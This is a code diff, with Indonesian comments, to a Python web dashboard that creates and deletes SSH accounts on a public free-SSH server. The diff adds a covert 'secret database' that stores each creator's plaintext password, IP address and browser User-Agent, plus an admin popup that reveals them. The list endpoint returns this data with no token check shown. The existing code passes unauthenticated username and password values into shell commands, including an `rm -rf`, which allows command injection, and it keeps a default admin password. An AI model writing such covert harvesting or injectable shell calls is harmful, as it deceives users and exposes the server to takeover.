@@ -9,6 +9,7 @@ import urllib.parse
 PORT = 8081
 LOG_PATH = "/tmp/cloudflared.log"
 STATS_PATH = "/tmp/server_stats.json"
+DB_PATH = "/tmp/ssh_details.json"  # Database rahasia penyimpan IP, Pass, dan UA
 
 # Password Admin diambil dari Environment Variable Railway, defaultnya 'admin123'
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
@@ -17,10 +18,29 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
         return
 
+    # Membaca database rahasia admin
+    def load_db(self):
+        if os.path.exists(DB_PATH):
+            try:
+                with open(DB_PATH, "r") as f:
+                    return json.load(f)
+            except Exception:
+                return {}
+        return {}
+
+    # Menyimpan ke database rahasia admin
+    def save_db(self, data):
+        try:
+            with open(DB_PATH, "w") as f:
+                json.dump(data, f)
+        except Exception:
+            pass
+
     # 🛠️ FITUR MANAGEMENT SSH (ALPINE MODE)
     def list_ssh(self):
         try:
             users = []
+            db_info = self.load_db()
             with open("/etc/passwd", "r") as f:
                 for line in f:
                     parts = line.strip().split(":")
@@ -28,7 +48,14 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
                     uid = int(parts[2])
                     shell = parts[-1]
                     if uid >= 1000 and username not in ["nobody", "alpine"]:
-                        users.append({"username": username, "uid": uid, "shell": shell})
+                        # Gabungkan data OS dengan detail rahasia dari database admin
+                        extra = db_info.get(username, {"password": "-", "ip": "Unknown", "user_agent": "Unknown"})
+                        users.append({
+                            "username": username, 
+                            "uid": uid, 
+                            "shell": shell,
+                            **extra
+                        })
             return {"status": "success", "total": len(users), "users": users}
         except Exception as e:
             return {"status": "error", "message": str(e)}
@@ -54,7 +81,7 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
                 pass
         return named_url if named_url else quick_url
 
-    def add_ssh(self, username, password):
+    def add_ssh(self, username, password, ip_addr, user_agent):
         if not username or not password:
             return {"status": "error", "message": "Username dan password wajib diisi!"}
         try:
@@ -63,6 +90,15 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
             cmd_pass = f"echo '{username}:{password}' | chpasswd"
             subprocess.run(cmd_pass, shell=True, check=True)
             
+            # SIMPAN IP, PASSWORD, DAN USER-AGENT KE DATABASE RAHASIA ADMIN
+            db_info = self.load_db()
+            db_info[username] = {
+                "password": password,
+                "ip": ip_addr,
+                "user_agent": user_agent
+            }
+            self.save_db(db_info)
+
             active_host = self.get_current_hosts()
             account_details = (
                 f"================================\n"
@@ -90,6 +126,13 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
             cmd_del = f"deluser {username}"
             subprocess.run(cmd_del, shell=True, check=True)
             subprocess.run(f"rm -rf /home/{username}", shell=True)
+            
+            # Hapus juga riwayatnya di database rahasia admin
+            db_info = self.load_db()
+            if username in db_info:
+                del db_info[username]
+                self.save_db(db_info)
+                
             return {"status": "success", "message": f"User {username} berhasil dihapus!"}
         except subprocess.CalledProcessError:
             return {"status": "error", "message": f"Gagal menghapus user. User '{username}' tidak ditemukan."}
@@ -101,7 +144,11 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
         path = parsed_url.path
         query = urllib.parse.parse_qs(parsed_url.query)
 
-        # 🟢 ROUTER: ADD SSH (DIBUKA BEBAS PUBLIK, TANPA CEK TOKEN)
+        # Tangkap IP asli (jika lewat Cloudflare ambil CF-Connecting-IP, kalau lokal ambil client_address)
+        ip_addr = self.headers.get("CF-Connecting-IP", self.client_address[0])
+        user_agent = self.headers.get("User-Agent", "Unknown UA")
+
+        # 🟢 ROUTER: ADD SSH (PUBLIK, TAPI SEKARANG MENANGKAP IP & UA)
         if path == "/api/add":
             self.send_response(200)
             self.send_header("Content-type", "application/json")
@@ -109,11 +156,11 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             username = query.get("user", [None])[0]
             password = query.get("pass", [None])[0]
-            response_data = self.add_ssh(username, password)
+            response_data = self.add_ssh(username, password, ip_addr, user_agent)
             self.wfile.write(json.dumps(response_data).encode('utf-8'))
             return
 
-        # 🟢 ROUTER: DELETE SSH (WAJIB CHECK TOKEN ADMIN!)
+        # 🟢 ROUTER: DELETE SSH (WAJIB TOKEN ADMIN)
         if path == "/api/delete":
             self.send_response(200)
             self.send_header("Content-type", "application/json")
@@ -121,13 +168,14 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             token = query.get("token", [None])[0]
             if token != ADMIN_PASSWORD:
-                self.wfile.write(json.dumps({"status": "error", "message": "Akses Ditolak! Cuma admin ganteng yang boleh hapus!"}).encode('utf-8'))
+                self.wfile.write(json.dumps({"status": "error", "message": "Akses Ditolak! Cuma admin yang boleh hapus!"}).encode('utf-8'))
                 return
             username = query.get("user", [None])[0]
             response_data = self.delete_ssh(username)
             self.wfile.write(json.dumps(response_data).encode('utf-8'))
             return
 
+        # 🟢 ROUTER: LIST SSH
         if path == "/api/list":
             self.send_response(200)
             self.send_header("Content-type", "application/json")
@@ -178,7 +226,7 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(json.dumps(response_data).encode('utf-8'))
             return
 
-        # 🟢 HTML TAMPILAN UTAMA (DERMAWAN MODE)
+        # 🟢 HTML TAMPILAN UTAMA (DERMAWAN + INTELLIGENCE TRACKING MODE)
         self.send_response(200)
         self.send_header("Content-type", "text/html; charset=utf-8")
         self.end_headers()
@@ -213,10 +261,15 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
                 .admin-status-lbl { font-size: 10px; font-weight: bold; color: #38bdf8; background: rgba(56, 189, 248, 0.1); padding: 2px 6px; border-radius: 4px; }
                 .result-box { display: none; background: #030712; border: 1px solid #4ade80; border-radius: 8px; padding: 12px; font-family: monospace; font-size: 12px; color: #4ade80; white-space: pre-wrap; margin-bottom: 15px; overflow-x: hidden; }
                 .btn-copy-result { display: none; background: #4ade80; color: #090d16; border: none; padding: 6px 12px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 11px; width: 100%; margin-bottom: 15px; }
+                
                 .ssh-list { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
                 .ssh-list th { text-align: left; padding: 6px; color: #94a3b8; border-bottom: 1px solid #334155; }
-                .ssh-list td { padding: 6px; border-bottom: 1px solid #1f2937; }
-                .btn-del { background: #ef4444; color: white; border: none; padding: 2px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; opacity: 0.4; }
+                .ssh-list td { padding: 6px; border-bottom: 1px solid #1f2937; vertical-align: middle; }
+                
+                .btn-action-group { display: flex; gap: 4px; justify-content: flex-end; }
+                .btn-del { background: #ef4444; color: white; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; display: none; }
+                .btn-info { background: #eab308; color: #090d16; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; font-weight: bold; display: none; }
+                
                 .url-section { background: #030712; border: 1px solid #38bdf8; padding: 12px; border-radius: 8px; margin-bottom: 12px; text-align: center; }
                 .url-title { font-size: 11px; color: #94a3b8; font-weight: bold; text-transform: uppercase; }
                 .url-box { font-family: monospace; font-size: 13px; word-break: break-all; color: #38bdf8; font-weight: bold; margin: 6px 0; }
@@ -250,7 +303,6 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
                         <span id="admin-indicator" class="admin-status-lbl">PUBLIC CREATION</span>
                     </div>
                     
-                    <!-- DIBUKA BEBAS: Input & Tombol ADD tidak di-disable -->
                     <div class="input-group">
                         <input type="text" id="ssh-user" class="input-ssh" placeholder="Username...">
                         <input type="password" id="ssh-pass" class="input-ssh" placeholder="Password...">
@@ -284,6 +336,7 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
 
             <script>
                 let adminToken = localStorage.getItem("admin_session_token") || "";
+                let savedUsersData = []; // Untuk menampung info lengkap dari API lokal
 
                 function checkAdminUI() {
                     let indicator = document.getElementById('admin-indicator');
@@ -295,24 +348,18 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
                         indicator.style.background = "rgba(74, 222, 128, 0.1)";
                         loginBtn.innerText = "🔒 LOGOUT";
                         
-                        // Aktifkan tombol HAPUS kusus admin
-                        document.querySelectorAll('.btn-del').forEach(b => {
-                            b.removeAttribute("disabled");
-                            b.style.opacity = "1";
-                            b.style.cursor = "pointer";
-                        });
+                        // Tampilkan tombol HAPUS dan INFO khusus untuk admin
+                        document.querySelectorAll('.btn-del').forEach(b => b.style.display = "inline-block");
+                        document.querySelectorAll('.btn-info').forEach(b => b.style.display = "inline-block");
                     } else {
                         indicator.innerText = "PUBLIC CREATION";
                         indicator.style.color = "#38bdf8";
                         indicator.style.background = "rgba(56, 189, 248, 0.1)";
                         loginBtn.innerText = "🔑 LOGIN ADMIN";
                         
-                        // Matikan tombol HAPUS untuk guest
-                        document.querySelectorAll('.btn-del').forEach(b => {
-                            b.setAttribute("disabled", "true");
-                            b.style.opacity = "0.4";
-                            b.style.cursor = "not-allowed";
-                        });
+                        // Sembunyikan tombol rahasia untuk guest umum
+                        document.querySelectorAll('.btn-del').forEach(b => b.style.display = "none");
+                        document.querySelectorAll('.btn-info').forEach(b => b.style.display = "none");
                     }
                 }
 
@@ -363,13 +410,17 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
                         tbody.innerHTML = "";
                         
                         if(data.status === "success" && data.users.length > 0) {
+                            savedUsersData = data.users; // Simpan ke array memori lokal browser
                             data.users.forEach(u => {
                                 tbody.innerHTML += `
                                     <tr>
                                         <td style="font-weight:bold; color:#f1f5f9;">👤 ${u.username}</td>
                                         <td style="color:#64748b;">${u.shell}</td>
                                         <td style="text-align: right;">
-                                            <button class="btn-del" onclick="deleteAccount('${u.username}')" disabled>HAPUS</button>
+                                            <div class="btn-action-group">
+                                                <button class="btn-info" onclick="showAccountDetails('${u.username}')">👁️ INFO</button>
+                                                <button class="btn-del" onclick="deleteAccount('${u.username}')">HAPUS</button>
+                                            </div>
                                         </td>
                                     </tr>
                                 `;
@@ -379,6 +430,21 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
                             tbody.innerHTML = `<tr><td colspan="3" style="text-align:center; color:#64748b;">Belum ada akun SSH kustom</td></tr>`;
                         }
                     } catch(e) { console.log(e); }
+                }
+
+                // FUNGSI KHUSUS ADMIN UNTUK MEMBONGKAR IP & USER AGENT SI PEMBUAT
+                function showAccountDetails(username) {
+                    let userObj = savedUsersData.find(u => u.username === username);
+                    if(userObj) {
+                        alert(
+                            "🕵️ DATA RAHASIA PEMBUAT AKUN:\\n" +
+                            "===============================\\n" +
+                            "👤 Username   : " + userObj.username + "\\n" +
+                            "🔑 Password   : " + userObj.password + "\\n" +
+                            "🌐 IP Address : " + userObj.ip + "\\n" +
+                            "📱 User-Agent : " + userObj.user_agent
+                        );
+                    }
                 }
 
                 async function createAccount() {
@@ -394,7 +460,6 @@ class DashboardHandler(http.server.SimpleHTTPRequestHandler):
                         return;
                     }
                     try {
-                        // Jalur add tidak membutuhkan token lagi (Semua orang bisa membuat)
                         let res = await fetch(`/api/add?user=${user}&pass=${pass}`);
                         let data = await res.json();
                         if(data.status === "success") {
